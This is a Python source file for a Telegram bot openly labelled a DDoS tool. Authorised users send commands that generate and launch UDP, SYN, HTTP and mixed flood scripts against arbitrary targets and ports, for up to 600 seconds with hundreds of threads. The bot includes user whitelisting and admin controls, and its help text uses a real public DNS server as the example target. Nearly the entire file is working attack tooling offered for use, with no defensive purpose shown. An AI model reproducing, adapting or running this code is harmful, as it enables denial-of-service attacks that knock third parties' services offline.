#!/usr/bin/env python3
"""
💀 DDOS TELEGRAM BOT - GitHub Codespaces Ready
"""

import telebot
import subprocess
import datetime
import os
import threading
import time
import random
import socket
import sys

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = os.getenv("ADMIN_IDS", "6186265634").split(",")
USER_FILE = "users.txt"
LOG_FILE = "logs.txt"

allowed_users = []
running_attacks = {}
cooldowns = {}
bot = telebot.TeleBot(BOT_TOKEN)
lock = threading.Lock()

# ========== ATTACK FUNCTIONS ==========

def create_udp_attack(target, port, duration, threads=500):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'
port={port}
duration={duration}
threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = random._urandom(65507)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s.sendto(payload, (target, port))
                count += 1
            except:
                pass
        s.close()
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_syn_attack(target, port, duration, threads=300):
    return f"""python3 -c "
import socket, random, time, threading, sys
target='{target}'
port={port}
duration={duration}
threads={threads}
def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s.connect_ex((target, port))
                count += 1
            except:
                pass
        s.close()
    except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_http_attack(target, port, duration, threads=200):
    return f"""python3 -c "
import urllib.request, random, time, threading, sys
target='{target}'
port={port}
duration={duration}
threads={threads}
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
]
def flood():
    end = time.time() + duration
    while time.time() < end:
        try:
            req = urllib.request.Request(f'http://{{target}}:{{port}}/')
            req.add_header('User-Agent', random.choice(user_agents))
            urllib.request.urlopen(req, timeout=2)
        except: pass
for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
\" """

def create_mixed_attack(target, port, duration, threads=300):
    return f"""python3 -c "
import socket, random, time, threading, urllib.request, sys
target='{target}'
port={port}
duration={duration}
threads={threads}
def udp_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1400)
        end = time.time() + duration
        while time.time() < end:
            try: s.sendto(payload, (target, port))
            except: pass
    except: pass
def syn_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        end = time.time() + duration
        while time.time() < end:
            try: s.connect_ex((target, port))
            except: pass
    except: pass
def http_flood():
    end = time.time() + duration
    while time.time() < end:
        try:
            urllib.request.urlopen(f'http://{{target}}:{{port}}/', timeout=1)
        except: pass
t = threads // 3
for i in range(t):
    threading.Thread(target=udp_flood, daemon=True).start()
    threading.Thread(target=syn_flood, daemon=True).start()
    threading.Thread(target=http_flood, daemon=True).start()
time.sleep(duration + 2)
\" """

# ========== EXECUTION ==========

def execute_attack(user_id, attack_type, target, port, duration):
    if not 1 <= port <= 65535:
        return False, "Port must be 1-65535"
    if not 1 <= duration <= 600:
        return False, "Duration must be 1-600 seconds"

    attack_map = {
        'udp': (create_udp_attack, 500),
        'syn': (create_syn_attack, 300),
        'http': (create_http_attack, 200),
        'mixed': (create_mixed_attack, 300),
    }

    if attack_type not in attack_map:
        return False, f"Unknown attack: {attack_type}"

    func, threads = attack_map[attack_type]

    try:
        cmd = func(target, port, duration, threads)
        temp_file = f"/tmp/attack_{int(time.time())}.py"
        with open(temp_file, "w") as f:
            f.write(cmd)
        os.chmod(temp_file, 0o755)

        process = subprocess.Popen(["python3", temp_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        with lock:
            if user_id not in running_attacks:
                running_attacks[user_id] = []
            running_attacks[user_id].append((process, temp_file))

        return True, f"Attack started on {target}:{port} for {duration}s"

    except Exception as e:
        return False, f"Error: {str(e)}"

def stop_user_attacks(user_id):
    with lock:
        if user_id not in running_attacks:
            return 0
        count = 0
        for process, temp_file in running_attacks[user_id]:
            try:
                process.terminate()
                time.sleep(0.2)
                process.kill()
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                count += 1
            except:
                pass
        running_attacks[user_id] = []
        return count

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user(user_id):
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")

# ========== TELEGRAM COMMANDS ==========

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, """💀 DDOS BOT v6.0

🔥 ATTACKS:
/udp <target> <port> <time>
/syn <target> <port> <time>
/http <target> <port> <time>
/mixed <target> <port> <time>

🛑 CONTROL:
/stopall - Stop your attacks
/status - Check attacks
/id - Get your ID

👑 Admin: /admin
Example: /udp 8.8.8.8 53 60""")

@bot.message_handler(commands=['id'])
def id_command(message):
    bot.reply_to(message, f"Your ID: `{message.chat.id}`", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = str(message.chat.id)
    with lock:
        if user_id not in running_attacks or not running_attacks[user_id]:
            bot.reply_to(message, "No active attacks")
            return
        bot.reply_to(message, f"Active attacks: {len(running_attacks[user_id])}")

@bot.message_handler(commands=['stopall'])
def stopall_command(message):
    user_id = str(message.chat.id)
    count = stop_user_attacks(user_id)
    bot.reply_to(message, f"Stopped {count} attack(s)")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admin only")
        return
    bot.reply_to(message, """👑 ADMIN:
/add <userid> - Add user
/remove <userid> - Remove user
/allusers - List users
/globalstop - Stop ALL""")

@bot.message_handler(commands=['add'])
def add_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /add <userid>")
        return
    new_user = parts[1]
    if new_user in allowed_users:
        bot.reply_to(message, f"User {new_user} already exists")
        return
    allowed_users.append(new_user)
    save_user(new_user)
    bot.reply_to(message, f"✅ User {new_user} added")

@bot.message_handler(commands=['remove'])
def remove_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /remove <userid>")
        return
    user_to_remove = parts[1]
    if user_to_remove not in allowed_users:
        bot.reply_to(message, f"User {user_to_remove} not found")
        return
    allowed_users = [u for u in allowed_users if u != user_to_remove]
    with open(USER_FILE, "w") as f:
        for u in allowed_users:
            f.write(f"{u}\n")
    bot.reply_to(message, f"✅ User {user_to_remove} removed")

@bot.message_handler(commands=['allusers'])
def allusers_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admin only")
        return
    if not allowed_users:
        bot.reply_to(message, "No users")
        return
    response = "👥 Users:\n"
    for uid in allowed_users:
        response += f"• {uid}\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['globalstop'])
def globalstop_command(message):
    if str(message.chat.id) not in ADMIN_IDS:
        bot.reply_to(message, "Admin only")
        return
    total = 0
    for uid in list(running_attacks.keys()):
        total += stop_user_attacks(uid)
    bot.reply_to(message, f"✅ Stopped {total} global attacks")

# ========== ATTACK HANDLER ==========

def make_handler(attack_type):
    def handler(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_users and user_id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Not authorized")
            return
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
            return
        target, port_str, duration_str = parts[1], parts[2], parts[3]
        try:
            port = int(port_str)
            duration = int(duration_str)
        except:
            bot.reply_to(message, "❌ Port and time must be numbers")
            return
        success, msg = execute_attack(user_id, attack_type, target, port, duration)
        bot.reply_to(message, f"{'✅' if success else '❌'} {msg}")
    return handler

# Register attacks
for attack in ['udp', 'syn', 'http', 'mixed']:
    handler = make_handler(attack)
    handler.__name__ = f"handle_{attack}"
    setattr(sys.modules[__name__], handler.__name__, handler)
    bot.message_handler(commands=[attack])(handler)

# ========== MAIN ==========

if __name__ == "__main__":
    print("💀 DDOS BOT v6.0 Starting...")
    print("=" * 40)
    allowed_users = load_users()
    for admin in ADMIN_IDS:
        if admin not in allowed_users:
            allowed_users.append(admin)
            save_user(admin)
    print(f"[+] Loaded {len(allowed_users)} users")
    print(f"[+] Admin IDs: {ADMIN_IDS}")
    print(f"[+] Bot Token: {BOT_TOKEN[:10]}...")
    print("=" * 40)
    print("[+] Bot running! Press Ctrl+C to stop.")
    bot.polling(none_stop=True)
